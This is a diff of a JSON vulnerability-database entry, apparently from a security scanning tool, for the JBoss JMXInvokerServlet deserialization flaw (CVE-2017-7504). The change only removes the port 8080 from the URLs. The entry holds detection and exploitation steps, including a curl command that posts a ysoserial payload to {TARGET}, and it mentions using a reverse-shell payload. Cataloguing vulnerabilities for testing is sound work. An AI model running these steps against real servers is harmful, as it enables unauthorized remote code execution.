@@ -34,7 +34,7 @@
     "/jmx-console",
     "/web-console"
   ],
-  "detection_method": "发送GET请求到 http://{TARGET}:8080/invoker/JMXInvokerServlet，如果返回HTTP 200状态码且响应头包含 Content-Type: application/x-java-serialized-object，则可能存在漏洞",
+  "detection_method": "发送GET请求到 http://{TARGET}/invoker/JMXInvokerServlet，如果返回HTTP 200状态码且响应头包含 Content-Type: application/x-java-serialized-object，则可能存在漏洞",
   "exploit_steps": [
     {
       "step": 1,
@@ -46,12 +46,12 @@
     {
       "step": 2,
       "description": "发送payload到目标服务器",
-      "command": "curl -X POST --data-binary @payload.ser http://{TARGET}:8080/invoker/JMXInvokerServlet -H \"Content-Type: application/x-java-serialized-object\"",
+      "command": "curl -X POST --data-binary @payload.ser http://{TARGET}/invoker/JMXInvokerServlet -H \"Content-Type: application/x-java-serialized-object\"",
       "expected_result": "返回HTTP 200状态码",
       "notes": "如果成功执行，会在目标服务器上创建/tmp/test文件"
     }
   ],
-  "verification_command": "curl -X POST --data-binary @payload.ser http://{TARGET}:8080/invoker/JMXInvokerServlet -H \"Content-Type: application/x-java-serialized-object\"",
+  "verification_command": "curl -X POST --data-binary @payload.ser http://{TARGET}/invoker/JMXInvokerServlet -H \"Content-Type: application/x-java-serialized-object\"",
   "verification_success_sign": "返回HTTP 200状态码，且目标服务器上执行了payload中的命令（如创建文件、执行系统命令等）",
   "requires_callback": false,
   "callback_note": "该漏洞本身不需要目标回连，但payload可以包含反弹shell命令，此时需要监听端口。替代方案：使用无回连的payload验证漏洞存在，如创建文件、执行whoami等命令",
@@ -64,7 +64,7 @@
     "jmx",
     "cve-2017-7504"
   ],
-  "search_text": "JBoss JMXInvokerServlet 反序列化漏洞，允许攻击者通过HTTP请求执行任意代码 java_deserialization CVE-2017-7504 jboss jboss as jboss application server jmxinvokerservlet cve-2017-7504 jboss 4.x jboss 5.x jboss 6.x jboss jboss-eap jboss-web jbossas jboss-4 jboss-5 jboss-6 /jmx-console /web-console /invoker/JMXInvokerServlet 发送GET请求到 http://{TARGET}:8080/invoker/JMXInvokerServlet，如果返回HTTP 200状态码且响应头包含 Content-Type: application/x-java-serialized-object，则可能存在漏洞 JBoss AS 4.x, 5.x, 6.x jboss deserialization rce java jmx cve-2017-7504 使用ysoserial生成反序列化payload 发送payload到目标服务器",
+  "search_text": "JBoss JMXInvokerServlet 反序列化漏洞，允许攻击者通过HTTP请求执行任意代码 java_deserialization CVE-2017-7504 jboss jboss as jboss application server jmxinvokerservlet cve-2017-7504 jboss 4.x jboss 5.x jboss 6.x jboss jboss-eap jboss-web jbossas jboss-4 jboss-5 jboss-6 /jmx-console /web-console /invoker/JMXInvokerServlet 发送GET请求到 http://{TARGET}/invoker/JMXInvokerServlet，如果返回HTTP 200状态码且响应头包含 Content-Type: application/x-java-serialized-object，则可能存在漏洞 JBoss AS 4.x, 5.x, 6.x jboss deserialization rce java jmx cve-2017-7504 使用ysoserial生成反序列化payload 发送payload到目标服务器",
   "embedding": [
     0.2022215873003006,
     -0.10758142173290253,
